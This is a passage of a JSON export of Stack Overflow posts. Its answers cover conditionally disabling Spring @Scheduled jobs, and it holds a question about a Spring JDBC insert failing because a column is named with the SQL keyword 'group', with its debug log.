{...}\n\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":6456733,"reputation":1883,"user_id":5404976,"accept_rate":50,"display_name":"Vinit Solanki"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1504080963,"creation_date":1504080963,"answer_id":45955311,"question_id":18406713,"body_markdown":"    @Component\r\n    public class CurrencySyncServiceImpl implements CurrencySyncService {\r\n    \r\n        private static Boolean isEnableSync;\r\n        /**\r\n         * Currency Sync FixedDelay in minutes\r\n         */\r\n        private static Integer fixedDelay;\r\n    \r\n        @Transactional\r\n        @Override\r\n        @Scheduled(fixedDelayString = &quot;#{${currency.sync.fixedDelay}*60*1000}&quot;)\r\n        public void sync() {\r\n            if(CurrencySyncServiceImpl.isEnableSync) {\r\n                //Do something\r\n                //you can use DAO or other autowired beans here.\r\n            }\r\n        }\r\n\r\n        @Value(&quot;${currency.sync.fixedDelay}&quot;)\r\n        public void setFixedDelay(Integer fixedDelay) {\r\n            CurrencySyncServiceImpl.fixedDelay = fixedDelay;\r\n        }\r\n\r\n        @Value(&quot;${currency.sync.isEnable}&quot;)\r\n        public void setIsEnableSync(Boolean isEnableSync) {\r\n            CurrencySyncServiceImpl.isEnableSync = isEnableSync;\r\n        }\r\n    }","title":"How to conditionally enable or disable scheduled jobs in Spring?","body":"<pre><code>@Component\npublic class CurrencySyncServiceImpl implements CurrencySyncService {\n\n    private static Boolean isEnableSync;\n    /**\n     * Currency Sync FixedDelay in minutes\n     */\n    private static Integer fixedDelay;\n\n    @Transactional\n    @Override\n    @Scheduled(fixedDelayString = \"#{${currency.sync.fixedDelay}*60*1000}\")\n    public void sync() {\n        if(CurrencySyncServiceImpl.isEnableSync) {\n            //Do something\n            //you can use DAO or other autowired beans here.\n        }\n    }\n\n    @Value(\"${currency.sync.fixedDelay}\")\n    public void setFixedDelay(Integer fixedDelay) {\n        CurrencySyncServiceImpl.fixedDelay = fixedDelay;\n    }\n\n    @Value(\"${currency.sync.isEnable}\")\n    public void setIsEnableSync(Boolean isEnableSync) {\n        CurrencySyncServiceImpl.isEnableSync = isEnableSync;\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2607312,"reputation":1234,"user_id":2258205,"display_name":"Suraj Muraleedharan"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1522917402,"creation_date":1522917402,"answer_id":49667774,"question_id":18406713,"body_markdown":"I know my answer is a hack, but giving a valid cron expression that never executes may fix the issue (in the environment specific configuration), https://stackoverflow.com/questions/13835221/quartz-cron-expression-that-will-never-execute\r\n","title":"How to conditionally enable or disable scheduled jobs in Spring?","body":"<p>I know my answer is a hack, but giving a valid cron expression that never executes may fix the issue (in the environment specific configuration), <a href=\"https://stackoverflow.com/questions/13835221/quartz-cron-expression-that-will-never-execute\">Quartz: Cron expression that will never execute</a></p>\n"},{"tags":[],"owner":{"account_id":4246469,"reputation":993,"user_id":3474985,"display_name":"user3474985"},"down_vote_count":0,"up_vote_count":30,"is_accepted":false,"score":30,"last_activity_date":1530819916,"creation_date":1530819916,"answer_id":51198831,"question_id":18406713,"body_markdown":"If you are looking to toggle @EnableScheduling from a property you can do this in Spring Boot by moving the @EnableScheduling annotation to a configuration class and use @ConditionalOnProperty as follows:\r\n\r\n\r\n    @Configuration\r\n    @EnableScheduling\r\n    @ConditionalOnProperty(prefix = &quot;com.example.scheduling&quot;, name=&quot;enabled&quot;, havingValue=&quot;true&quot;, matchIfMissing = true)\r\n    public class SchedulingConfiguration {\r\n\r\n    }\r\n\r\nThis will disable scheduling for the application. This may be useful in a situation where you want to be able to run the application once or scheduled depending on how it&#39;s being started.\r\n\r\nFrom wilkinsona&#39;s comment on here: https://github.com/spring-projects/spring-boot/issues/12682","title":"How to conditionally enable or disable scheduled jobs in Spring?","body":"<p>If you are looking to toggle @EnableScheduling from a property you can do this in Spring Boot by moving the @EnableScheduling annotation to a configuration class and use @ConditionalOnProperty as follows:</p>\n\n<pre><code>@Configuration\n@EnableScheduling\n@ConditionalOnProperty(prefix = \"com.example.scheduling\", name=\"enabled\", havingValue=\"true\", matchIfMissing = true)\npublic class SchedulingConfiguration {\n\n}\n</code></pre>\n\n<p>This will disable scheduling for the application. This may be useful in a situation where you want to be able to run the application once or scheduled depending on how it's being started.</p>\n\n<p>From wilkinsona's comment on here: <a href=\"https://github.com/spring-projects/spring-boot/issues/12682\" rel=\"noreferrer\">https://github.com/spring-projects/spring-boot/issues/12682</a></p>\n"},{"tags":[],"owner":{"account_id":1325321,"reputation":626,"user_id":1270266,"display_name":"labm0nkey"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1534338459,"creation_date":1534338459,"answer_id":51859345,"question_id":18406713,"body_markdown":"You can also create a Bean based on condition and that Bean can have a Scheduled method.\r\n\r\n    @Component\r\n    @Configuration\r\n    @EnableScheduling\r\n    public class CustomCronComponent {\r\n        @Bean\r\n        @ConditionalOnProperty(value = &quot;my.cron.enabled&quot;, matchIfMissing = true, havingValue = &quot;true&quot;)\r\n        public MyCronTask runMyCronTask() {\r\n            return new MyCronTask();\r\n        }\r\n    }\r\n\r\nand\r\n\r\n    @Component\r\n    public class MyCronTask {\r\n        @Scheduled(cron = &quot;${my.cron.expression}&quot;)\r\n        public void run() {\r\n            String a = &quot;&quot;;\r\n        }\r\n    }\r\n\r\n","title":"How to conditionally enable or disable scheduled jobs in Spring?","body":"<p>You can also create a Bean based on condition and that Bean can have a Scheduled method.</p>\n\n<pre><code>@Component\n@Configuration\n@EnableScheduling\npublic class CustomCronComponent {\n    @Bean\n    @ConditionalOnProperty(value = \"my.cron.enabled\", matchIfMissing = true, havingValue = \"true\")\n    public MyCronTask runMyCronTask() {\n        return new MyCronTask();\n    }\n}\n</code></pre>\n\n<p>and</p>\n\n<pre><code>@Component\npublic class MyCronTask {\n    @Scheduled(cron = \"${my.cron.expression}\")\n    public void run() {\n        String a = \"\";\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":7965642,"reputation":1330,"user_id":6011941,"accept_rate":60,"display_name":"Vpn_talent"},"down_vote_count":0,"up_vote_count":80,"is_accepted":false,"score":80,"last_activity_date":1618198551,"creation_date":1566813455,"answer_id":57655646,"question_id":18406713,"body_markdown":"The most efficient way to disable `@Scheduled` in Spring is to set cron expression to `-`\r\n\r\n    @Scheduled(cron = &quot;-&quot;)\r\n\tpublic void autoEvictAllCache() {\r\n\t\tLOGGER.info(&quot;Refresing the Cache Start :: &quot; + new Date());\r\n\t\tactiveMQUtility.sendToTopicCacheEviction(&quot;ALL&quot;);\r\n\t\tLOGGER.info(&quot;Refresing the Cache Complete :: &quot; + new Date());\r\n\t}\r\n\r\nFrom the [docs][1]:\r\n\r\n&gt; CRON_DISABLED  \r\n&gt; \r\n&gt; public static final String CRON_DISABLED  \r\n&gt; A special cron\r\n&gt; expression value that indicates a disabled trigger: &quot;-&quot;. This is\r\n&gt; primarily meant for use with ${...} placeholders, allowing for\r\n&gt; external disabling of corresponding scheduled methods.\r\n&gt; \r\n&gt; Since:\r\n&gt; 5.1 See Also: ScheduledTaskRegistrar.CRON_DISABLED\r\n\r\n\r\n  [1]: https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/scheduling/annotation/Scheduled.html#CRON_DISABLED","title":"How to conditionally enable or disable scheduled jobs in Spring?","body":"<p>The most efficient way to disable <code>@Scheduled</code> in Spring is to set cron expression to <code>-</code></p>\n<pre><code>@Scheduled(cron = &quot;-&quot;)\npublic void autoEvictAllCache() {\n    LOGGER.info(&quot;Refresing the Cache Start :: &quot; + new Date());\n    activeMQUtility.sendToTopicCacheEviction(&quot;ALL&quot;);\n    LOGGER.info(&quot;Refresing the Cache Complete :: &quot; + new Date());\n}\n</code></pre>\n<p>From the <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/scheduling/annotation/Scheduled.html#CRON_DISABLED\" rel=\"noreferrer\">docs</a>:</p>\n<blockquote>\n<p>CRON_DISABLED</p>\n<p>public static final String CRON_DISABLED<br />\nA special cron\nexpression value that indicates a disabled trigger: &quot;-&quot;. This is\nprimarily meant for use with ${...} placeholders, allowing for\nexternal disabling of corresponding scheduled methods.</p>\n<p>Since:\n5.1 See Also: ScheduledTaskRegistrar.CRON_DISABLED</p>\n</blockquote>\n"},{"tags":[],"owner":{"account_id":10742871,"reputation":71,"user_id":7905312,"display_name":"Bin"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1576307382,"creation_date":1576307382,"answer_id":59333073,"question_id":18406713,"body_markdown":"Please see my answer in another question. I think this is the best way to solve it.\r\n[How to stop a scheduled task that was started using @Scheduled annotation?\r\n][1]\r\n\r\n\r\n  [1]: https://stackoverflow.com/questions/44644141/how-to-stop-a-scheduled-task-that-was-started-using-scheduled-annotation/59262900#59262900\r\n\r\nDefine a custom annotation like below.\r\n\r\n    @Documented\r\n    @Retention (RUNTIME)\r\n    @Target(ElementType.TYPE)\r\n    public @interface ScheduledSwitch {\r\n        // do nothing\r\n    }\r\n\r\nDefine a class implements org.springframework.scheduling.annotation.ScheduledAnnotationBeanPostProcessor.\r\n\r\n    public class ScheduledAnnotationBeanPostProcessorCustom \r\n        extends ScheduledAnnotationBeanPostProcessor {\r\n    \r\n        @Value(value = &quot;${prevent.scheduled.tasks:false}&quot;)\r\n        private boolean preventScheduledTasks;\r\n    \r\n        private Map&lt;Object, String&gt; beans = new HashMap&lt;&gt;();\r\n    \r\n        private final ReentrantLock lock = new ReentrantLock(true);\r\n    \r\n        @Override\r\n        public Object postProcessAfterInitialization(Object bean, String beanName) {\r\n            ScheduledSwitch switch = AopProxyUtils.ultimateTargetClass(bean)\r\n                .getAnnotation(ScheduledSwitch.class);\r\n            if (null != switch) {\r\n                beans.put(bean, beanName);\r\n                if (preventScheduledTasks) {\r\n                    return bean;\r\n                }\r\n            }\r\n            return super.postProcessAfterInitialization(bean, beanName);\r\n        }\r\n    \r\n        public void stop() {\r\n            lock.lock();\r\n            try {\r\n                for (Map.Entry&lt;Object, String&gt; entry : beans.entrySet()) {\r\n                    postProcessBeforeDestruction(entry.getKey(), entry.getValue());\r\n                }\r\n            } finally {\r\n                lock.unlock();\r\n            }\r\n        }\r\n    \r\n        public void start() {\r\n            lock.lock();\r\n            try {\r\n                for (Map.Entry&lt;Object, String&gt; entry : beans.entrySet()) {\r\n                    if (!requiresDestruction(entry.getKey())) {\r\n                        super.postProcessAfterInitialization(\r\n                            entry.getKey(), entry.getValue());\r\n                    }\r\n                }\r\n            } finally {\r\n                lock.unlock();\r\n            }\r\n        }\r\n    \r\n    }\r\n\r\nReplace ScheduledAnnotationBeanPostProcessor bean by the custom bean in configuration.\r\n\r\n    @Configuration\r\n    public class ScheduledConfig {\r\n    \r\n        @Bean(name = TaskManagementConfigUtils.SCHEDULED_ANNOTATION_PROCESSOR_BEAN_NAME)\r\n        @Role(BeanDefinition.ROLE_INFRASTRUCTURE)\r\n        public ScheduledAnnotationBeanPostProcessor scheduledAnnotationBeanPostProcessor() {\r\n            return new ScheduledAnnotationBeanPostProcessorCustom();\r\n        }\r\n    \r\n    }\r\n\r\n\r\nAdd @ScheduledSwitch annotation to the beans that you want to prevent or stop @Scheduled tasks.\r\n","title":"How to conditionally enable or disable scheduled jobs in Spring?","body":"<p>Please see my answer in another question. I think this is the best way to solve it.\n<a href=\"https://stackoverflow.com/questions/44644141/how-to-stop-a-scheduled-task-that-was-started-using-scheduled-annotation/59262900#59262900\">How to stop a scheduled task that was started using @Scheduled annotation?\n</a></p>\n\n<p>Define a custom annotation like below.</p>\n\n<pre><code>@Documented\n@Retention (RUNTIME)\n@Target(ElementType.TYPE)\npublic @interface ScheduledSwitch {\n    // do nothing\n}\n</code></pre>\n\n<p>Define a class implements org.springframework.scheduling.annotation.ScheduledAnnotationBeanPostProcessor.</p>\n\n<pre><code>public class ScheduledAnnotationBeanPostProcessorCustom \n    extends ScheduledAnnotationBeanPostProcessor {\n\n    @Value(value = \"${prevent.scheduled.tasks:false}\")\n    private boolean preventScheduledTasks;\n\n    private Map&lt;Object, String&gt; beans = new HashMap&lt;&gt;();\n\n    private final ReentrantLock lock = new ReentrantLock(true);\n\n    @Override\n    public Object postProcessAfterInitialization(Object bean, String beanName) {\n        ScheduledSwitch switch = AopProxyUtils.ultimateTargetClass(bean)\n            .getAnnotation(ScheduledSwitch.class);\n        if (null != switch) {\n            beans.put(bean, beanName);\n            if (preventScheduledTasks) {\n                return bean;\n            }\n        }\n        return super.postProcessAfterInitialization(bean, beanName);\n    }\n\n    public void stop() {\n        lock.lock();\n        try {\n            for (Map.Entry&lt;Object, String&gt; entry : beans.entrySet()) {\n                postProcessBeforeDestruction(entry.getKey(), entry.getValue());\n            }\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public void start() {\n        lock.lock();\n        try {\n            for (Map.Entry&lt;Object, String&gt; entry : beans.entrySet()) {\n                if (!requiresDestruction(entry.getKey())) {\n                    super.postProcessAfterInitialization(\n                        entry.getKey(), entry.getValue());\n                }\n            }\n        } finally {\n            lock.unlock();\n        }\n    }\n\n}\n</code></pre>\n\n<p>Replace ScheduledAnnotationBeanPostProcessor bean by the custom bean in configuration.</p>\n\n<pre><code>@Configuration\npublic class ScheduledConfig {\n\n    @Bean(name = TaskManagementConfigUtils.SCHEDULED_ANNOTATION_PROCESSOR_BEAN_NAME)\n    @Role(BeanDefinition.ROLE_INFRASTRUCTURE)\n    public ScheduledAnnotationBeanPostProcessor scheduledAnnotationBeanPostProcessor() {\n        return new ScheduledAnnotationBeanPostProcessorCustom();\n    }\n\n}\n</code></pre>\n\n<p>Add @ScheduledSwitch annotation to the beans that you want to prevent or stop @Scheduled tasks.</p>\n"},{"tags":[],"owner":{"account_id":11464204,"reputation":487,"user_id":9832322,"display_name":"Abhilash"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1683713187,"creation_date":1588926100,"answer_id":61674985,"question_id":18406713,"body_markdown":"We can disable the bean creation of the class having that scheduled methods using `@Conditional` annotation. This is very similar to `@ConditionalOnProperty`. This is used to conditionally spin up a bean on to the spring context. If we set the value to `false`, then the bean will not be spun up and loaded to spring. Below is the code.\r\n```\r\napplication.properties:\r\n\r\n    com.boot.enable.scheduling=enable\r\n```\r\nCondition:\r\n\r\n    public class ConditionalBeans implements Condition {\r\n    \t@Override\r\n    \tpublic boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) {\r\n    \t\treturn &quot;enabled&quot;.equalsIgnoreCase(context.getEnvironment().getProperty(&quot;com.boot.enable.scheduling&quot;));\r\n    \t}\r\n    }\r\n\r\nMy schedule class\r\n\r\n    @Service\r\n    @Conditional(ConditionalBeans.class)\r\n    public class PrintPeriodicallyService {\r\n    \r\n    \t@Scheduled(fixedRate = 3000)\r\n    \tpublic void runEvery3Seconds() {\r\n    \t\tSystem.out.println(&quot;Current time : &quot; + new Date().getTime());\r\n    \t}\r\n    }\r\n\r\nThis approach has a lot of flexibility where the condition generation is totally under our control.","title":"How to conditionally enable or disable scheduled jobs in Spring?","body":"<p>We can disable the bean creation of the class having that scheduled methods using <code>@Conditional</code> annotation. This is very similar to <code>@ConditionalOnProperty</code>. This is used to conditionally spin up a bean on to the spring context. If we set the value to <code>false</code>, then the bean will not be spun up and loaded to spring. Below is the code.</p>\n<pre><code>application.properties:\n\n    com.boot.enable.scheduling=enable\n</code></pre>\n<p>Condition:</p>\n<pre><code>public class ConditionalBeans implements Condition {\n    @Override\n    public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) {\n        return &quot;enabled&quot;.equalsIgnoreCase(context.getEnvironment().getProperty(&quot;com.boot.enable.scheduling&quot;));\n    }\n}\n</code></pre>\n<p>My schedule class</p>\n<pre><code>@Service\n@Conditional(ConditionalBeans.class)\npublic class PrintPeriodicallyService {\n\n    @Scheduled(fixedRate = 3000)\n    public void runEvery3Seconds() {\n        System.out.println(&quot;Current time : &quot; + new Date().getTime());\n    }\n}\n</code></pre>\n<p>This approach has a lot of flexibility where the condition generation is totally under our control.</p>\n"}],"owner":{"account_id":122100,"reputation":16858,"user_id":315677,"accept_rate":81,"display_name":"Pierre Henry"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":168055,"favorite_count":0,"down_vote_count":1,"up_vote_count":116,"accepted_answer_id":18406954,"answer_count":11,"score":115,"last_activity_date":1683713187,"creation_date":1377272188,"question_id":18406713,"body_markdown":"I am defining scheduled jobs with cron style patterns in Spring, using the `@Scheduled` annotation.\r\n\r\nThe cron pattern is stored in a config properties file. Actually there are two properties files: one default config, and one profile config that is environment dependent (e.g. dev, test, prod customer 1, prod customer 2 etc.) and overrides some of the default values.\r\n\r\nI configured a property placeholder bean in my spring context which allows me to use `${}` style placeholders to import values from my properties files.\r\n\r\nThe job beans looks like this:\r\n\r\n    @Component\r\n    public class ImagesPurgeJob implements Job {\r\n    \t\r\n    \tprivate Logger logger = Logger.getLogger(this.getClass());\r\n    \r\n    \t@Override\r\n        @Transactional(readOnly=true)\r\n        @Scheduled(cron = &quot;${jobs.mediafiles.imagesPurgeJob.schedule}&quot;)\r\n    \tpublic void execute() {\r\n    \t\t//Do something\r\n                //can use DAO or other autowired beans here\r\n    \t}\r\n    }\r\n\r\nRelevant parts of my context XML :\r\n\r\n    &lt;!-- Enable configuration of scheduled tasks via annotations --&gt;\r\n        &lt;task:annotation-driven/&gt;\r\n    \r\n    &lt;!-- Load configuration files and allow &#39;${}&#39; style placeholders --&gt;\r\n        &lt;bean class=&quot;org.springframework.context.support.PropertySourcesPlaceholderConfigurer&quot;&gt;\r\n            &lt;property name=&quot;locations&quot;&gt;\r\n                &lt;list&gt;\r\n                    &lt;value&gt;classpath:config/default-config.properties&lt;/value&gt;\r\n                    &lt;value&gt;classpath:config/environment-config.properties&lt;/value&gt;\r\n                &lt;/list&gt;\r\n            &lt;/property&gt;\r\n            &lt;property name=&quot;ignoreUnresolvablePlaceholders&quot; value=&quot;true&quot;/&gt;\r\n            &lt;property name=&quot;ignoreResourceNotFound&quot; value=&quot;false&quot;/&gt;\r\n        &lt;/bean&gt;\r\n\r\n\r\nI really like this. It&#39;s quite simple and clean with minimal XML.\r\n\r\nHowever I have one more requirement: some of these jobs can be totally disabled in some cases.\r\n\r\nSo, before I used Spring to manage them I created them manually and there is a boolean parameter along with the cron parameter in the config files, to specify if the job has to be enabled or not:\r\n\r\n    jobs.mediafiles.imagesPurgeJob.enable=true or false\r\n    jobs.mediafiles.imagesPurgeJob.schedule=0 0 0/12 * * ?\r\n\r\nHow can I use this parameter in Spring to conditionally create or just plainly ignore the bean, depending on this config parameter?\r\n\r\nOne obvious workaround would be to define a cron pattern that would never evaluate, so the job is never executed. But the bean would still be created and the config would be a bit obscure, so I feel there must be a better solution.","title":"How to conditionally enable or disable scheduled jobs in Spring?","body":"<p>I am defining scheduled jobs with cron style patterns in Spring, using the <code>@Scheduled</code> annotation.</p>\n\n<p>The cron pattern is stored in a config properties file. Actually there are two properties files: one default config, and one profile config that is environment dependent (e.g. dev, test, prod customer 1, prod customer 2 etc.) and overrides some of the default values.</p>\n\n<p>I configured a property placeholder bean in my spring context which allows me to use <code>${}</code> style placeholders to import values from my properties files.</p>\n\n<p>The job beans looks like this:</p>\n\n<pre><code>@Component\npublic class ImagesPurgeJob implements Job {\n\n    private Logger logger = Logger.getLogger(this.getClass());\n\n    @Override\n    @Transactional(readOnly=true)\n    @Scheduled(cron = \"${jobs.mediafiles.imagesPurgeJob.schedule}\")\n    public void execute() {\n        //Do something\n            //can use DAO or other autowired beans here\n    }\n}\n</code></pre>\n\n<p>Relevant parts of my context XML :</p>\n\n<pre><code>&lt;!-- Enable configuration of scheduled tasks via annotations --&gt;\n    &lt;task:annotation-driven/&gt;\n\n&lt;!-- Load configuration files and allow '${}' style placeholders --&gt;\n    &lt;bean class=\"org.springframework.context.support.PropertySourcesPlaceholderConfigurer\"&gt;\n        &lt;property name=\"locations\"&gt;\n            &lt;list&gt;\n                &lt;value&gt;classpath:config/default-config.properties&lt;/value&gt;\n                &lt;value&gt;classpath:config/environment-config.properties&lt;/value&gt;\n            &lt;/list&gt;\n        &lt;/property&gt;\n        &lt;property name=\"ignoreUnresolvablePlaceholders\" value=\"true\"/&gt;\n        &lt;property name=\"ignoreResourceNotFound\" value=\"false\"/&gt;\n    &lt;/bean&gt;\n</code></pre>\n\n<p>I really like this. It's quite simple and clean with minimal XML.</p>\n\n<p>However I have one more requirement: some of these jobs can be totally disabled in some cases.</p>\n\n<p>So, before I used Spring to manage them I created them manually and there is a boolean parameter along with the cron parameter in the config files, to specify if the job has to be enabled or not:</p>\n\n<pre><code>jobs.mediafiles.imagesPurgeJob.enable=true or false\njobs.mediafiles.imagesPurgeJob.schedule=0 0 0/12 * * ?\n</code></pre>\n\n<p>How can I use this parameter in Spring to conditionally create or just plainly ignore the bean, depending on this config parameter?</p>\n\n<p>One obvious workaround would be to define a cron pattern that would never evaluate, so the job is never executed. But the bean would still be created and the config would be a bit obscure, so I feel there must be a better solution.</p>\n"},{"tags":["java","spring-boot","spring-jdbc"],"answers":[{"tags":[],"owner":{"account_id":277416,"reputation":681848,"user_id":571407,"accept_rate":100,"display_name":"JB Nizet"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1560623988,"creation_date":1560623988,"answer_id":56613191,"question_id":56613156,"body_markdown":"`group` is a SQL keyword. Choose another name for your column.","title":"SQLSyntaxErrorException in Spring JDBC with BeanPropertySqlParameterSource","body":"<p><code>group</code> is a SQL keyword. Choose another name for your column.</p>\n"},{"tags":[],"owner":{"account_id":10579662,"reputation":25,"user_id":7793981,"display_name":"SZ."},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683712890,"creation_date":1683712890,"answer_id":76217113,"question_id":56613156,"body_markdown":"As there are a lot of SQL keywords and it&#39;s impossible to avoid all of them so one possible solution is to pass column names and add escaping,\r\n\r\n    String[] columns = {&quot;name&quot;, &quot;desc&quot;,  &quot;code&quot;, &quot;`group`&quot;, &quot;`order`&quot;}\r\n    \r\n    SimpleJdbcInsert insert = new SimpleJdbcInsert(getJdbcTemplate());\r\n    insert.withTableName(tableName);\r\n    insert.usingColumns(columns);\r\n    insert.usingGeneratedKeyColumns(&quot;id&quot;);\r\n    \r\n    Number id = insert.executeAndReturnKey(parameterSource);\r\n\r\nNote that in order to pass parameter for *keyword as column name*, you need to add escaping while setting params like:\r\n\r\n    params.put(&quot;`group`&quot;, &quot;group_&quot;);\r\n    params.put(&quot;`order`&quot;, 3);\r\n    params.put(&quot;name&quot;, &quot;name_&quot;);","title":"SQLSyntaxErrorException in Spring JDBC with BeanPropertySqlParameterSource","body":"<p>As there are a lot of SQL keywords and it's impossible to avoid all of them so one possible solution is to pass column names and add escaping,</p>\n<pre><code>String[] columns = {&quot;name&quot;, &quot;desc&quot;,  &quot;code&quot;, &quot;`group`&quot;, &quot;`order`&quot;}\n\nSimpleJdbcInsert insert = new SimpleJdbcInsert(getJdbcTemplate());\ninsert.withTableName(tableName);\ninsert.usingColumns(columns);\ninsert.usingGeneratedKeyColumns(&quot;id&quot;);\n\nNumber id = insert.executeAndReturnKey(parameterSource);\n</code></pre>\n<p>Note that in order to pass parameter for <em>keyword as column name</em>, you need to add escaping while setting params like:</p>\n<pre><code>params.put(&quot;`group`&quot;, &quot;group_&quot;);\nparams.put(&quot;`order`&quot;, 3);\nparams.put(&quot;name&quot;, &quot;name_&quot;);\n</code></pre>\n"}],"owner":{"account_id":121323,"reputation":1251,"user_id":314336,"accept_rate":22,"display_name":"xyzt"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":446,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":56613191,"answer_count":2,"score":0,"last_activity_date":1683712890,"creation_date":1560623730,"question_id":56613156,"body_markdown":"I use Spring JDBC in my SpringBoot application.\r\nThis is one of my data classes:\r\n\r\n\r\n    @Getter\r\n    @Setter\r\n    @NoArgsConstructor\r\n    @Wither\r\n    @Builder\r\n    @AllArgsConstructor\r\n    public class MTAccountData {\r\n    \tprivate int id;\r\n    \tprivate boolean enable;\r\n    \tprivate boolean readOnlyAccount;\r\n    \tprivate String group;\r\n    \tprivate int leverage;\r\n    \tprivate int agentAccount;\r\n    \tprivate double balance;\r\n    \tprivate double prevMonthBalance;\r\n    \tprivate double prevBalance;\r\n    \tprivate double credit;\r\n    \tprivate double interestRate;\r\n    \tprivate double taxes;\r\n    \tprivate double prevMonthEquity;\r\n    \tprivate double prevEquity;\r\n    \tprivate int registrationDate;\r\n    \tprivate int lastConnectionDate;\r\n    }\r\nAnd MySQL table is as follows:\r\n\r\n    CREATE TABLE `accounts` (\r\n      `id` int(11) NOT NULL AUTO_INCREMENT,\r\n      `enable` bit(1) DEFAULT NULL,\r\n      `readOnlyAccount` bit(1) DEFAULT NULL,\r\n      `group` varchar(45) DEFAULT NULL,\r\n      `leverage` int(11) DEFAULT NULL,\r\n      `agentAccount` int(11) DEFAULT NULL,\r\n      `balance` float DEFAULT NULL,\r\n      `prevMonthBalance` float DEFAULT NULL,\r\n      `prevBalance` float DEFAULT NULL,\r\n      `credit` float DEFAULT NULL,\r\n      `interestRate` float DEFAULT NULL,\r\n      `taxes` float DEFAULT NULL,\r\n      `prevMonthEquity` float DEFAULT NULL,\r\n      `prevEquity` float DEFAULT NULL,\r\n      `registrationDate` int(11) DEFAULT NULL,\r\n      `lastConnectionDate` int(11) DEFAULT NULL,\r\n      PRIMARY KEY (`id`)\r\n    ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;\r\n\r\n\r\nIn my service class I have a method to save a new account to MySQL database:\r\n\r\n\t\r\n\r\n    private void saveAccount(Integer companyId, MTAccountData account) {\r\n    \t\tSqlParameterSource accountParameters = new BeanPropertySqlParameterSource(account);\r\n    \t\tint generatedAccountId = new SimpleJdbcInsert(dataSource) //\r\n    \t\t\t\t.usingGeneratedKeyColumns(&quot;ID&quot;) //\r\n    \t\t\t\t.withTableName(tableName(companyId)) //\r\n    \t\t\t\t.executeAndReturnKey(accountParameters) //\r\n    \t\t\t\t.intValue();\r\n    \t\taccount.setId(generatedAccountId);\r\n    \t}\r\n\r\nI enabled Spring JDBC debugging and it prints debug logs when I try to save a record but I get the exception that is seen at the end of my post.\r\nI couldn&#39;t figure out the reason... Is there something wrong with the save method?\r\n\r\n    2019-06-15 21:21:11.926  INFO 32737 --- [nio-9090-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet &#39;dispatcherServlet&#39;\r\n    2019-06-15 21:21:11.926  INFO 32737 --- [nio-9090-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet &#39;dispatcherServlet&#39;\r\n    2019-06-15 21:21:11.937  INFO 32737 --- [nio-9090-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 11 ms\r\n    2019-06-15 21:21:12.073 DEBUG 32737 --- [nio-9090-exec-1] o.s.jdbc.core.simple.SimpleJdbcInsert    : JdbcInsert not compiled before execution - invoking compile\r\n    2019-06-15 21:21:12.099 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.m.TableMetaDataProviderFactory   : Using GenericTableMetaDataProvider\r\n    2019-06-15 21:21:12.099 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : GetGeneratedKeys is supported\r\n    2019-06-15 21:21:12.099 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : GeneratedKeysColumnNameArray is supported for MySQL\r\n    2019-06-15 21:21:12.127 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieving meta-data for mtsync_test/root@localhost/accounts\r\n    2019-06-15 21:21:12.140 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: id 4 false\r\n    2019-06-15 21:21:12.140 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: enable -7 true\r\n    2019-06-15 21:21:12.141 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: readOnlyAccount -7 true\r\n    2019-06-15 21:21:12.141 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: group 12 true\r\n    2019-06-15 21:21:12.141 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: leverage 4 true\r\n    2019-06-15 21:21:12.142 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: agentAccount 4 true\r\n    2019-06-15 21:21:12.142 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: balance 7 true\r\n    2019-06-15 21:21:12.142 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: prevMonthBalance 7 true\r\n    2019-06-15 21:21:12.142 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: prevBalance 7 true\r\n    2019-06-15 21:21:12.142 DEBUG 32737 --- [nio-9090-exec-1] o.s.j.c.metadata.TableMetaDataProvider   : Retrieved meta-data: credit 7 true\r\n    2019-06-15 21:21:12.142 DEBUG 32737 --- 